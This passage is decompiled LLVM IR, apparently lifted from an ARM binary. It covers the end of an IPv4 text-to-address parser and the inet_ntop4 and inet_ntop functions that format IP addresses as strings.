  %v3_278cc = inttoptr i32 %v2_278dc to i8*
  store i8 %v4_278c8, i8* %v3_278cc, align 1
  %v0_278d0 = load i32, i32* @lr, align 4
  %v1_278d0 = trunc i32 %v0_278d0 to i8
  %v2_278d0 = load i32, i32* %fp.global-to-local, align 4
  %v3_278d0 = load i32, i32* %r1.global-to-local, align 4
  %v4_278d0 = add i32 %v3_278d0, %v2_278d0
  %v5_278d0 = inttoptr i32 %v4_278d0 to i8*
  store i8 %v1_278d0, i8* %v5_278d0, align 1
  %v0_278d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_278d4.pre = load i32, i32* @ip, align 4
  %v1_278dc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_278d4

dec_label_pc_278d4:                               ; preds = %dec_label_pc_278d4.preheader, %dec_label_pc_278c8
  %v0_278e8 = phi i32 [ %v1_278ec.pre, %dec_label_pc_278d4.preheader ], [ %v1_278dc.pre, %dec_label_pc_278c8 ]
  %v1_278d8 = phi i32 [ %v2_278b4, %dec_label_pc_278d4.preheader ], [ %v1_278d4.pre, %dec_label_pc_278c8 ]
  %v0_278e0 = phi i32 [ 1, %dec_label_pc_278d4.preheader ], [ %v0_278d4.pre, %dec_label_pc_278c8 ]
  %v2_278d4 = sub i32 %v0_278e0, %v1_278d8
  %v4_278d4 = xor i32 %v0_278e0, %v1_278d8
  %v5_278d4 = xor i32 %v2_278d4, %v0_278e0
  %v6_278d4 = and i32 %v5_278d4, %v4_278d4
  %v7_278d4 = icmp slt i32 %v6_278d4, 0
  %v8_278d4 = icmp slt i32 %v2_278d4, 0
  %v9_278d4 = icmp eq i32 %v0_278e0, %v1_278d8
  %v2_278d8 = sub i32 %v1_278d8, %v0_278e0
  store i32 %v2_278d8, i32* %r1.global-to-local, align 4
  %v1_278e0 = add i32 %v0_278e0, 1
  store i32 %v1_278e0, i32* %r2.global-to-local, align 4
  %v3_278e4 = xor i1 %v8_278d4, %v7_278d4
  %v4_278e4 = or i1 %v9_278d4, %v3_278e4
  br i1 %v4_278e4, label %dec_label_pc_278c8, label %dec_label_pc_278e8

dec_label_pc_278e8:                               ; preds = %dec_label_pc_278d4
  store i32 %v0_278e8, i32* @r4, align 4
  br label %dec_label_pc_278ec

dec_label_pc_278ec:                               ; preds = %dec_label_pc_278a8, %dec_label_pc_278e8
  %v0_278ec = phi i32 [ %v0_278e8, %dec_label_pc_278e8 ], [ %v0_278ec.pre, %dec_label_pc_278a8 ]
  %v1_278ec = phi i32 [ %v0_278e8, %dec_label_pc_278e8 ], [ %v1_278ec.pre, %dec_label_pc_278a8 ]
  %v9_278ec = icmp eq i32 %v0_278ec, %v1_278ec
  br i1 %v9_278ec, label %dec_label_pc_278f4, label %dec_label_pc_2790c

dec_label_pc_278f4:                               ; preds = %dec_label_pc_278ec
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_2775c, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_27900 = call i32 @memcpy()
  br label %dec_label_pc_27924

dec_label_pc_2790c:                               ; preds = %dec_label_pc_277c4, %dec_label_pc_277f0, %dec_label_pc_27810, %dec_label_pc_27804, %dec_label_pc_278b0, %dec_label_pc_27854, %dec_label_pc_27840, %dec_label_pc_278ec, %dec_label_pc_27780, %dec_label_pc_27888, %dec_label_pc_27848
  br label %dec_label_pc_27924

dec_label_pc_27914:                               ; preds = %dec_label_pc_27740
  %v0_27914 = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_2791c = inttoptr i32 %v0_27914 to i32*
  store i32 97, i32* %v2_2791c, align 4
  br label %dec_label_pc_27924

dec_label_pc_27924:                               ; preds = %dec_label_pc_2790c, %dec_label_pc_278f4, %dec_label_pc_2774c, %dec_label_pc_27914
  %v1_2792c = phi i32 [ 0, %dec_label_pc_2790c ], [ 1, %dec_label_pc_278f4 ], [ %v3_27754, %dec_label_pc_2774c ], [ -1, %dec_label_pc_27914 ]
  store i32 %v3_27720, i32* @r4, align 4
  store i32 %v6_27720, i32* @r5, align 4
  store i32 %v9_27720, i32* @r6, align 4
  store i32 %v12_27720, i32* @r7, align 4
  store i32 %v27_27720, i32* @lr, align 4
  ret i32 %v1_2792c

; uselistorder directives
  uselistorder i32 %v2_278d8, { 1, 0 }
  uselistorder i32 %v2_278d4, { 1, 0 }
  uselistorder i32 %v0_278e0, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_278d8, { 1, 3, 0, 2 }
  uselistorder i32 %v0_278e8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_278ec.pre, { 0, 2, 1 }
  uselistorder i32 %v0_278ec.pre, { 2, 0, 1 }
  uselistorder i32 %v3_27898, { 1, 0 }
  uselistorder i32 %v0_27880.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_27870, { 1, 0 }
  uselistorder i32 %v0_27848, { 1, 0, 2 }
  uselistorder i32 %v3_2781c, { 1, 0 }
  uselistorder i32 %v0_27810, { 1, 0, 2 }
  uselistorder i32 %v1_277bc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_277ac, { 1, 0 }
  uselistorder i32 %v0_27798, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_27924, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_2790c, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_278ec, { 1, 0 }
  uselistorder label %dec_label_pc_278d4, { 1, 0 }
  uselistorder label %dec_label_pc_278a8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_27870.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_277ac, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_27a14 = ptrtoint i32* %stack_var_-40 to i32
  %v2_279f4 = add i32 %v2_27a14, -17
  br label %dec_label_pc_27a14

dec_label_pc_27964:                               ; preds = %dec_label_pc_27a14
  %v0_27964 = load i32, i32* %fp.global-to-local, align 4
  %v2_27964 = add i32 %v0_27964, %v1_27964
  %v3_27964 = inttoptr i32 %v2_27964 to i8*
  %v4_27964 = load i8, i8* %v3_27964, align 1
  %v6_27964 = zext i8 %v4_27964 to i32
  store i32 %v6_27964, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_27964, 100
  %v2_2796c = zext i8 %div4 to i32
  store i32 %v2_2796c, i32* %r0.global-to-local, align 4
  %v1_27970 = or i8 %div4, 48
  %v3_27974 = add i32 %v2_27a24, -17
  %v4_27974 = inttoptr i32 %v3_27974 to i8*
  store i8 %v1_27970, i8* %v4_27974, align 1
  %v0_27978 = load i32, i32* %r5.global-to-local, align 4
  %v1_27978 = add i32 %v0_27978, -17
  %v2_27978 = inttoptr i32 %v1_27978 to i8*
  %v3_27978 = load i8, i8* %v2_27978, align 1
  %v0_2797c = load i32, i32* %r6.global-to-local, align 4
  %v1_2797c = add i32 %v0_2797c, 1
  store i32 %v1_2797c, i32* %r6.global-to-local, align 4
  store i32 %v2_27a14, i32* %r2.global-to-local, align 4
  %v7_27984 = icmp eq i8 %v3_27978, 48
  %v0_2798c = load i32, i32* %r4.global-to-local, align 4
  %v0_27994 = load i32, i32* %fp.global-to-local, align 4
  %v1_27994 = load i32, i32* %sl.global-to-local, align 4
  %v2_27994 = add i32 %v1_27994, %v0_27994
  store i32 %v2_27994, i32* %sb.global-to-local, align 4
  %v2_2799c = udiv i32 %v0_2798c, 10
  %v1_279a4 = urem i32 %v2_2799c, 256
  %v2_279a8 = udiv i32 %v1_279a4, 10
  %v3_279a8 = urem i32 %v1_279a4, 10
  store i32 %v2_279a8, i32* %r0.global-to-local, align 4
  %v1_279ac = or i32 %v3_279a8, 48
  br i1 %v7_27984, label %dec_label_pc_2799c, label %dec_label_pc_279c4

dec_label_pc_2799c:                               ; preds = %dec_label_pc_27964
  %v7_279b4 = icmp eq i32 %v1_279ac, 48
  br i1 %v7_279b4, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_2799c
  store i32 %v1_2797c, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_2799c, %bb
  %v1_279bc = trunc i32 %v1_279ac to i8
  store i8 %v1_279bc, i8* %v2_27978, align 1
  %v0_279f0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_279e0

dec_label_pc_279c4:                               ; preds = %dec_label_pc_27964
  %v2_27990 = add i32 %v1_2797c, %v2_27a14
  %v1_279d8 = trunc i32 %v1_279ac to i8
  %v3_279d8 = add i32 %v2_27990, -17
  %v4_279d8 = inttoptr i32 %v3_279d8 to i8*
  store i8 %v1_279d8, i8* %v4_279d8, align 1
  %v0_279dc = load i32, i32* %r6.global-to-local, align 4
  %v1_279dc = add i32 %v0_279dc, 1
  store i32 %v1_279dc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_279e0

dec_label_pc_279e0:                               ; preds = %bb18, %dec_label_pc_279c4
  %v0_279f0 = phi i32 [ %v0_279f0.pre, %bb18 ], [ %v1_279dc, %dec_label_pc_279c4 ]
  %v0_279e0 = load i32, i32* %sb.global-to-local, align 4
  %v1_279e0 = inttoptr i32 %v0_279e0 to i8*
  %v2_279e0 = load i8, i8* %v1_279e0, align 1
  %tmp19 = urem i8 %v2_279e0, 10
  store i32 %v2_27a14, i32* %ip.global-to-local, align 4
  %v1_279f0 = add i32 %v0_279f0, 1
  store i32 %v1_279f0, i32* %r0.global-to-local, align 4
  %v1_279f8 = or i8 %tmp19, 48
  %v3_279fc = add i32 %v2_279f4, %v0_279f0
  %v4_279fc = inttoptr i32 %v3_279fc to i8*
  store i8 %v1_279f8, i8* %v4_279fc, align 1
  %v0_27a00 = load i32, i32* %ip.global-to-local, align 4
  %v1_27a00 = load i32, i32* %r0.global-to-local, align 4
  %v2_27a00 = add i32 %v1_27a00, %v0_27a00
  store i32 %v2_27a00, i32* %r2.global-to-local, align 4
  %v3_27a08 = add i32 %v2_27a00, -17
  %v4_27a08 = inttoptr i32 %v3_27a08 to i8*
  store i8 46, i8* %v4_27a08, align 1
  %v0_27a0c = load i32, i32* %r0.global-to-local, align 4
  %v1_27a0c = add i32 %v0_27a0c, 1
  store i32 %v1_27a0c, i32* %r6.global-to-local, align 4
  %v0_27a10 = load i32, i32* %sl.global-to-local, align 4
  %v1_27a10 = add i32 %v0_27a10, 1
  store i32 %v1_27a10, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_27a14

dec_label_pc_27a14:                               ; preds = %entry, %dec_label_pc_279e0
  %v0_27a20 = phi i32 [ 0, %entry ], [ %v1_27a0c, %dec_label_pc_279e0 ]
  %v1_27964 = phi i32 [ 0, %entry ], [ %v1_27a10, %dec_label_pc_279e0 ]
  store i32 %v2_27a14, i32* %ip.global-to-local, align 4
  store i32 %v0_27a20, i32* %r7.global-to-local, align 4
  %v2_27a24 = add i32 %v0_27a20, %v2_27a14
  store i32 %v2_27a24, i32* %r5.global-to-local, align 4
  %v7_27a28 = icmp sgt i32 %v1_27964, 3
  br i1 %v7_27a28, label %dec_label_pc_27a2c, label %dec_label_pc_27964

dec_label_pc_27a2c:                               ; preds = %dec_label_pc_27a14
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_27a30 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_27a30, i32* %r4.global-to-local, align 4
  %v3_27a34 = add i32 %v2_27a24, -18
  %v4_27a34 = inttoptr i32 %v3_27a34 to i8*
  store i8 0, i8* %v4_27a34, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_27a30, i32* %r0.global-to-local, align 4
  %v3_27a3c = call i32 @strlen(i8* %tmp20)
  store i32 %v3_27a3c, i32* %r0.global-to-local, align 4
  %v2_27a40 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_27a40, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_27a3c, %v2_27a40
  br i1 %tmp, label %dec_label_pc_27a4c, label %dec_label_pc_27a60

dec_label_pc_27a4c:                               ; preds = %dec_label_pc_27a2c
  %v0_27a4c = call i32 @__GI___errno_location()
  store i32 %v0_27a4c, i32* %r0.global-to-local, align 4
  %v0_27a54 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_27a54, i32* %r2.global-to-local, align 4
  %v2_27a58 = inttoptr i32 %v0_27a4c to i32*
  store i32 28, i32* %v2_27a58, align 4
  %v0_27a70.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27a70

dec_label_pc_27a60:                               ; preds = %dec_label_pc_27a2c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_27a30, i32* @r1, align 4
  %v2_27a68 = inttoptr i32 %arg2 to i8*
  %v3_27a68 = call i32 @strcpy(i8* %v2_27a68, i32 %v2_27a30)
  store i32 %v3_27a68, i32* %r0.global-to-local, align 4
  store i32 %v3_27a68, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27a70

dec_label_pc_27a70:                               ; preds = %dec_label_pc_27a4c, %dec_label_pc_27a60
  %v0_27a70 = phi i32 [ %v0_27a70.pre, %dec_label_pc_27a4c ], [ %v3_27a68, %dec_label_pc_27a60 ]
  store i32 %v0_27a70, i32* %r0.global-to-local, align 4
  ret i32 %v0_27a70

; uselistorder directives
  uselistorder i32 %v0_27a70, { 1, 0 }
  uselistorder i32 %v2_27a30, { 1, 0, 2, 3 }
  uselistorder i32 %v2_27a24, { 0, 2, 1 }
  uselistorder i32 %v1_27964, { 1, 0 }
  uselistorder i32 %v1_279ac, { 1, 0, 2 }
  uselistorder i32 %v2_27a14, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_27a70, { 1, 0 }
  uselistorder label %dec_label_pc_27a14, { 1, 0 }
  uselistorder label %dec_label_pc_279e0, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v3_27a80 = load i32, i32* @r4, align 4
  %v6_27a80 = load i32, i32* @r5, align 4
  %v9_27a80 = load i32, i32* @r6, align 4
  %v12_27a80 = load i32, i32* @r7, align 4
  %v15_27a80 = load i32, i32* @r8, align 4
  %v18_27a80 = load i32, i32* @sb, align 4
  %v21_27a80 = load i32, i32* @sl, align 4
  %v24_27a80 = load i32, i32* @fp, align 4
  %v27_27a80 = load i32, i32* @lr, align 4
  %v7_27a8c = icmp eq i32 %arg1, 2
  store i1 %v7_27a8c, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_27a8c, label %dec_label_pc_27ab0, label %dec_label_pc_27aa4

dec_label_pc_27aa4:                               ; preds = %entry
  %v7_27aa4 = icmp eq i32 %arg1, 10
  store i1 %v7_27aa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_27aa4, label %dec_label_pc_27ac4, label %dec_label_pc_27cd8

dec_label_pc_27ab0:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_27abc = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_27cd0

dec_label_pc_27ac4:                               ; preds = %dec_label_pc_27aa4
  %v2_27ac4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_27ac4, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 32, i32* @r2, align 4
  %v0_27ad0 = call i32 @__GI_memset()
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_27af4 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_27ad8

dec_label_pc_27ad8:                               ; preds = %dec_label_pc_27ad8.dec_label_pc_27ad8_crit_edge, %dec_label_pc_27ac4
  %v0_27af0 = phi i32 [ %v0_27ad8.pre, %dec_label_pc_27ad8.dec_label_pc_27ad8_crit_edge ], [ 0, %dec_label_pc_27ac4 ]
  %v1_27ad8 = load i32, i32* @r8, align 4
  %v2_27ad8 = add i32 %v1_27ad8, %v0_27af0
  %v3_27adc = inttoptr i32 %v2_27ad8 to i8*
  %v4_27adc = load i8, i8* %v3_27adc, align 1
  %v6_27adc = zext i8 %v4_27adc to i32
  %v1_27ae0 = add i32 %v2_27ad8, 1
  %v2_27ae0 = inttoptr i32 %v1_27ae0 to i8*
  %v3_27ae0 = load i8, i8* %v2_27ae0, align 1
  %v4_27ae0 = zext i8 %v3_27ae0 to i32
  %tmp74 = icmp slt i32 %v0_27af0, 0
  %v4_27ae4 = zext i1 %tmp74 to i32
  %v5_27ae4 = add i32 %v4_27ae4, %v0_27af0
  %v4_27ae8 = mul nuw nsw i32 %v6_27adc, 256
  %v5_27ae8 = or i32 %v4_27ae0, %v4_27ae8
  store i32 %v5_27ae8, i32* %r2.global-to-local, align 4
  %v3_27aec = sdiv i32 %v5_27ae4, 2
  %v1_27af0 = add i32 %v0_27af0, 2
  store i32 %v1_27af0, i32* %r0.global-to-local, align 4
  %v4_27af8 = mul i32 %v3_27aec, 4
  %v5_27af8 = add i32 %v4_27af8, %v2_27af4
  %v7_27afc = icmp eq i32 %v1_27af0, 15
  store i1 %v7_27afc, i1* %cpsr_z.global-to-local, align 1
  %v2_27b00 = add i32 %v5_27af8, -32
  %v3_27b00 = inttoptr i32 %v2_27b00 to i32*
  store i32 %v5_27ae8, i32* %v3_27b00, align 4
  %v7_27b04 = icmp sgt i32 %v1_27af0, 15
  br i1 %v7_27b04, label %dec_label_pc_27b08, label %dec_label_pc_27ad8.dec_label_pc_27ad8_crit_edge

dec_label_pc_27ad8.dec_label_pc_27ad8_crit_edge:  ; preds = %dec_label_pc_27ad8
  %v0_27ad8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_27ad8

dec_label_pc_27b08:                               ; preds = %dec_label_pc_27ad8
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_27b20

dec_label_pc_27b20:                               ; preds = %dec_label_pc_27b08, %dec_label_pc_27b6c
  %v0_27b60 = phi i32 [ -1, %dec_label_pc_27b08 ], [ %v0_27b94, %dec_label_pc_27b6c ]
  %v0_27b50 = phi i32 [ -1, %dec_label_pc_27b08 ], [ %v0_27b80, %dec_label_pc_27b6c ]
  %v0_27b34 = phi i32 [ -1, %dec_label_pc_27b08 ], [ %v0_27b347, %dec_label_pc_27b6c ]
  %v0_27b6c = phi i32 [ 0, %dec_label_pc_27b08 ], [ %v1_27b6c, %dec_label_pc_27b6c ]
  %v4_27b24 = mul nuw nsw i32 %v0_27b6c, 4
  %v5_27b24 = add i32 %v4_27b24, %v2_27af4
  %v1_27b28 = add i32 %v5_27b24, -32
  %v2_27b28 = inttoptr i32 %v1_27b28 to i32*
  %v3_27b28 = load i32, i32* %v2_27b28, align 4
  %v2_27b2c = icmp eq i32 %v3_27b28, 0
  %v7_27b34 = icmp eq i32 %v0_27b34, -1
  br i1 %v2_27b2c, label %dec_label_pc_27b34, label %dec_label_pc_27b48

dec_label_pc_27b34:                               ; preds = %dec_label_pc_27b20
  br i1 %v7_27b34, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_27b34
  store i32 %v0_27b6c, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_27b6c

.thread:                                          ; preds = %dec_label_pc_27b34
  %v1_27b40.pre = load i32, i32* @r4, align 4
  %v2_27b40 = add i32 %v1_27b40.pre, 1
  store i32 %v2_27b40, i32* @r4, align 4
  br label %dec_label_pc_27b6c

dec_label_pc_27b48:                               ; preds = %dec_label_pc_27b20
  br i1 %v7_27b34, label %dec_label_pc_27b6c, label %dec_label_pc_27b50

dec_label_pc_27b50:                               ; preds = %dec_label_pc_27b48
  %v7_27b50 = icmp eq i32 %v0_27b50, -1
  %v0_27b64.pre = load i32, i32* @r4, align 4
  %v1_27b58 = load i32, i32* @r7, align 4
  %v7_27b5c = icmp sgt i32 %v0_27b64.pre, %v1_27b58
  %or.cond = or i1 %v7_27b50, %v7_27b5c
  br i1 %or.cond, label %dec_label_pc_27b60, label %dec_label_pc_27b68

dec_label_pc_27b60:                               ; preds = %dec_label_pc_27b50
  store i32 %v0_27b60, i32* @r6, align 4
  store i32 %v0_27b64.pre, i32* @r7, align 4
  br label %dec_label_pc_27b68

dec_label_pc_27b68:                               ; preds = %dec_label_pc_27b50, %dec_label_pc_27b60
  %v0_27b5012 = phi i32 [ %v0_27b60, %dec_label_pc_27b60 ], [ %v0_27b50, %dec_label_pc_27b50 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_27b6c

dec_label_pc_27b6c:                               ; preds = %bb, %.thread, %dec_label_pc_27b48, %dec_label_pc_27b68
  %v0_27b94 = phi i32 [ %v0_27b60, %.thread ], [ %v0_27b6c, %bb ], [ %v0_27b60, %dec_label_pc_27b48 ], [ -1, %dec_label_pc_27b68 ]
  %v0_27b347 = phi i32 [ %v0_27b34, %.thread ], [ %v0_27b6c, %bb ], [ -1, %dec_label_pc_27b48 ], [ -1, %dec_label_pc_27b68 ]
  %v0_27b80 = phi i32 [ %v0_27b50, %.thread ], [ %v0_27b50, %bb ], [ %v0_27b50, %dec_label_pc_27b48 ], [ %v0_27b5012, %dec_label_pc_27b68 ]
  %v1_27b6c = add nuw nsw i32 %v0_27b6c, 1
  %v7_27b74 = icmp slt i32 %v1_27b6c, 8
  br i1 %v7_27b74, label %dec_label_pc_27b20, label %dec_label_pc_27b78

dec_label_pc_27b78:                               ; preds = %dec_label_pc_27b6c
  %v7_27b78 = icmp eq i32 %v0_27b94, -1
  store i1 %v7_27b78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_27b78, label %dec_label_pc_27b78.dec_label_pc_27b98_crit_edge, label %dec_label_pc_27b80

dec_label_pc_27b78.dec_label_pc_27b98_crit_edge:  ; preds = %dec_label_pc_27b78
  %v1_27bbc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_27b98

dec_label_pc_27b80:                               ; preds = %dec_label_pc_27b78
  %v7_27b80 = icmp eq i32 %v0_27b80, -1
  store i1 %v7_27b80, i1* %cpsr_z.global-to-local, align 1
  %v0_27b90.pre = load i32, i32* @r4, align 4
  br i1 %v7_27b80, label %dec_label_pc_27b90, label %dec_label_pc_27b88

dec_label_pc_27b88:                               ; preds = %dec_label_pc_27b80
  %v1_27b88 = load i32, i32* @r7, align 4
  %v9_27b88 = icmp eq i32 %v0_27b90.pre, %v1_27b88
  store i1 %v9_27b88, i1* %cpsr_z.global-to-local, align 1
  %v7_27b8c = icmp sgt i32 %v0_27b90.pre, %v1_27b88
  br i1 %v7_27b8c, label %dec_label_pc_27b90, label %dec_label_pc_27b98

dec_label_pc_27b90:                               ; preds = %dec_label_pc_27b80, %dec_label_pc_27b88
  store i32 %v0_27b90.pre, i32* @r7, align 4
  store i32 %v0_27b94, i32* @r6, align 4
  br label %dec_label_pc_27b98

dec_label_pc_27b98:                               ; preds = %dec_label_pc_27b78.dec_label_pc_27b98_crit_edge, %dec_label_pc_27b88, %dec_label_pc_27b90
  %v1_27bbc.pre = phi i32 [ %v1_27b88, %dec_label_pc_27b88 ], [ %v1_27bbc.pre.pre, %dec_label_pc_27b78.dec_label_pc_27b98_crit_edge ], [ %v0_27b90.pre, %dec_label_pc_27b90 ]
  %v0_27b98 = phi i32 [ %v0_27b80, %dec_label_pc_27b88 ], [ %v0_27b80, %dec_label_pc_27b78.dec_label_pc_27b98_crit_edge ], [ %v0_27b94, %dec_label_pc_27b90 ]
  %v7_27b98 = icmp eq i32 %v0_27b98, -1
  store i1 %v7_27b98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_27b98, label %dec_label_pc_27b98._crit_edge, label %dec_label_pc_27ba0

dec_label_pc_27ba0:                               ; preds = %dec_label_pc_27b98
  %v7_27ba0 = icmp eq i32 %v1_27bbc.pre, 1
  store i1 %v7_27ba0, i1* %cpsr_z.global-to-local, align 1
  %v7_27ba4 = icmp slt i32 %v1_27bbc.pre, 2
  br i1 %v7_27ba4, label %bb54, label %dec_label_pc_27b98._crit_edge

bb54:                                             ; preds = %dec_label_pc_27ba0
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_27b98._crit_edge

dec_label_pc_27b98._crit_edge:                    ; preds = %dec_label_pc_27b98, %dec_label_pc_27ba0, %bb54
  %v0_27bbc = phi i32 [ %v0_27b98, %dec_label_pc_27ba0 ], [ -1, %bb54 ], [ %v0_27b98, %dec_label_pc_27b98 ]
  %v2_27bac = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_27bac, i32* @r4, align 4
  %v0_27bb0 = load i32, i32* @r5, align 4
  %v2_27bb0 = add i32 %v0_27bb0, -36332
  store i32 %v2_27bb0, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_27bbc = add i32 %v0_27bbc, %v1_27bbc.pre
  store i32 %v2_27bbc, i32* @sl, align 4
  %v9_27c1c = icmp eq i32 %tmp, 65535
  %v7_27bc468 = icmp eq i32 %v0_27bbc, -1
  store i1 %v7_27bc468, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_27bc4

dec_label_pc_27bc4:                               ; preds = %dec_label_pc_27b98._crit_edge, %dec_label_pc_27c74
  %v7_27bc472 = phi i1 [ %v7_27bc468, %dec_label_pc_27b98._crit_edge ], [ %v7_27bc4, %dec_label_pc_27c74 ]
  %v0_27bf071 = phi i32 [ 0, %dec_label_pc_27b98._crit_edge ], [ %v1_27c74, %dec_label_pc_27c74 ]
  %v1_27bdc70 = phi i32 [ %v0_27bbc, %dec_label_pc_27b98._crit_edge ], [ %v0_27bc4.pre, %dec_label_pc_27c74 ]
  %v2_27bf469 = phi i32 [ %v2_27bac, %dec_label_pc_27b98._crit_edge ], [ %v3_27be029, %dec_label_pc_27c74 ]
  br i1 %v7_27bc472, label %dec_label_pc_27be8, label %dec_label_pc_27bcc

dec_label_pc_27bcc:                               ; preds = %dec_label_pc_27bc4
  %v9_27bcc = icmp eq i32 %v0_27bf071, %v1_27bdc70
  store i1 %v9_27bcc, i1* %cpsr_z.global-to-local, align 1
  %v5_27bd0 = icmp slt i32 %v0_27bf071, %v1_27bdc70
  br i1 %v5_27bd0, label %dec_label_pc_27be8, label %dec_label_pc_27bd4

dec_label_pc_27bd4:                               ; preds = %dec_label_pc_27bcc
  %v1_27bd4 = load i32, i32* @sl, align 4
  %v9_27bd4 = icmp eq i32 %v0_27bf071, %v1_27bd4
  store i1 %v9_27bd4, i1* %cpsr_z.global-to-local, align 1
  %v6_27bd8 = icmp slt i32 %v0_27bf071, %v1_27bd4
  br i1 %v6_27bd8, label %dec_label_pc_27bdc, label %dec_label_pc_27be8

dec_label_pc_27bdc:                               ; preds = %dec_label_pc_27bd4
  store i1 %v9_27bcc, i1* %cpsr_z.global-to-local, align 1
